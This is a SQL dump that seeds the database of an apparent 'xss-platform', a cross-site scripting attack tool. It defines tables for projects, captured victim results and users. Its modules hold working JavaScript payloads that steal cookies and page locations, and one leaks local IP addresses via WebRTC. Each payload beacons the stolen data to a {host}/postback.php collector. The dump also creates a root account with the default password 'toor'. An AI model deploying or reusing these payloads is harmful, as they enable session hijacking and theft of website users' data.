-- phpMyAdmin SQL Dump
-- version 4.9.5deb2
-- https://www.phpmyadmin.net/
--
-- Host: localhost:3306
-- Generation Time: Jul 15, 2020 at 05:13 AM
-- Server version: 8.0.20-0ubuntu0.20.04.1
-- PHP Version: 7.4.3

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET AUTOCOMMIT = 0;
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Database: `xss-platform`
--

-- --------------------------------------------------------

--
-- Table structure for table `invite`
--

CREATE TABLE `invite` (
  `code` varchar(255) COLLATE utf8mb4_bin NOT NULL,
  `inviter` varchar(255) COLLATE utf8mb4_bin NOT NULL,
  `invitee` varchar(255) COLLATE utf8mb4_bin DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_bin;

-- --------------------------------------------------------

--
-- Table structure for table `modules`
--

CREATE TABLE `modules` (
  `guid` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_bin NOT NULL,
  `module_name` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_bin NOT NULL,
  `payload` text CHARACTER SET utf8mb4 COLLATE utf8mb4_bin NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_bin;

--
-- Dumping data for table `modules`
--

set @root_uuid=uuid();

INSERT INTO `modules` (`guid`, `module_name`, `payload`) VALUES
('2ac3a5c7-6f17-4768-beab-324a82e75458', '弹窗测试', 'alert(&quot;xss&quot;)'),
('df803ba4-e35b-47cc-b0be-8374f2e75210', '读取Cookie', 'var x=new Image();\r\ntry\r\n{\r\nvar myopener=&#039;&#039;;\r\nmyopener=window.opener &amp;&amp; window.opener.location ? window.opener.location : &#039;&#039;;\r\n}\r\ncatch(err)\r\n{\r\n}\r\nx.src=&#039;{host}/postback.php?id={projectId}&amp;location=&#039;+escape(document.location)+&#039;toplocation=&#039;+escape(top.document.location)+&#039;&amp;cookie=&#039;+escape(document.cookie);'),
('6BB5A215-5101-5041-9751-E1F6B670F0D9', 'WebRTC查真实IP', 'function findIP(onNewIP) {\n	var myPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;\n	var pc = new myPeerConnection({iceServers: [{urls: &quot;stun:stun.l.google.com:19302&quot;}]}),\n	noop = function() {},\n	localIPs = {},\n	ipRegex = /([0-9]{1,3}(\\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/g,\n	key;\n\n	function ipIterate(ip) {\n		if (!localIPs[ip] &amp;&amp; ip != &#039;0.0.0.0&#039;) {\n			onNewIP(ip);\n		}\n		localIPs[ip] = true;\n	}\n	  \n	pc.createDataChannel(&quot;&quot;);\n	 \n	pc.createOffer(function(sdp) {\n		sdp.sdp.split(&#039;\\n&#039;).forEach(function(line) {\n			if (line.indexOf(&#039;candidate&#039;) &lt; 0) return;\n			line.match(ipRegex).forEach(ipIterate);\n		});\n		pc.setLocalDescription(sdp, noop, noop);\n	}, noop);\n	  \n	pc.onicecandidate = function(ice) {\n		if (!ice || !ice.candidate || !ice.candidate.candidate || !ice.candidate.candidate.match(ipRegex)) return;\n		ice.candidate.candidate.match(ipRegex).forEach(ipIterate);\n	};\n}\n\nfunction addIP(ip) {\n	var x=new Image();\n	x.src=&#039;{host}/postback.php?id={projectId}&amp;ip=&#039;+escape(ip);\n}\nfindIP(addIP);');

-- --------------------------------------------------------

--
-- Table structure for table `project`
--

CREATE TABLE `project` (
  `guid` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_bin NOT NULL,
  `user_guid` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_bin NOT NULL,
  `project_name` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_bin NOT NULL,
  `timestamp` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `payload` text CHARACTER SET utf8mb4 COLLATE utf8mb4_bin NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_bin;

--
-- Dumping data for table `project`
--

INSERT INTO `project` (`guid`, `user_guid`, `project_name`, `timestamp`, `payload`) VALUES
('5WDCa1', @root_uuid, '读取Cookie', '2020-06-20 07:19:13', 'var x=new Image();\r\ntry\r\n{\r\nvar myopener=&#039;&#039;;\r\nmyopener=window.opener &amp;&amp; window.opener.location ? window.opener.location : &#039;&#039;;\r\n}\r\ncatch(err)\r\n{\r\n}\r\nx.src=&#039;{host}/postback.php?id={projectId}&amp;location=&#039;+escape(document.location)+&#039;&amp;toplocation=&#039;+escape(top.document.location)+&#039;&amp;cookie=&#039;+escape(document.cookie);'),
('Hq5Cu9', @root_uuid, '弹窗测试', '2020-06-19 11:30:10', 'alert(&quot;xss&quot;)');

-- --------------------------------------------------------

--
-- Table structure for table `result`
--

CREATE TABLE `result` (
  `guid` varchar(255) COLLATE utf8mb4_bin NOT NULL,
  `project_guid` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_bin NOT NULL,
  `timestamp` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `ip_addr` varchar(255) COLLATE utf8mb4_bin NOT NULL,
  `content` text COLLATE utf8mb4_bin NOT NULL,
  `headers` text COLLATE utf8mb4_bin NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_bin;

-- --------------------------------------------------------

--
-- Table structure for table `user`
--

CREATE TABLE `user` (
  `guid` varchar(255) COLLATE utf8mb4_bin NOT NULL,
  `username` varchar(255) COLLATE utf8mb4_bin NOT NULL,
  `password` varchar(255) COLLATE utf8mb4_bin NOT NULL,
  `nickname` varchar(255) COLLATE utf8mb4_bin NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_bin;

--
-- Dumping data for table `user`
--

INSERT INTO `user` (`guid`, `username`, `password`, `nickname`) VALUES (@root_uuid, 'root', md5(concat(md5('toor'),@root_uuid)), '盘古大帝');

--
-- Indexes for dumped tables
--

--
-- Indexes for table `invite`
--
ALTER TABLE `invite`
  ADD PRIMARY KEY (`code`);

--
-- Indexes for table `modules`
--
ALTER TABLE `modules`
  ADD PRIMARY KEY (`guid`),
  ADD UNIQUE KEY `module_name` (`module_name`);

--
-- Indexes for table `project`
--
ALTER TABLE `project`
  ADD PRIMARY KEY (`guid`),
  ADD UNIQUE KEY `schme_name` (`project_name`);

--
-- Indexes for table `user`
--
ALTER TABLE `user`
  ADD PRIMARY KEY (`guid`),
  ADD UNIQUE KEY `username` (`username`);
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
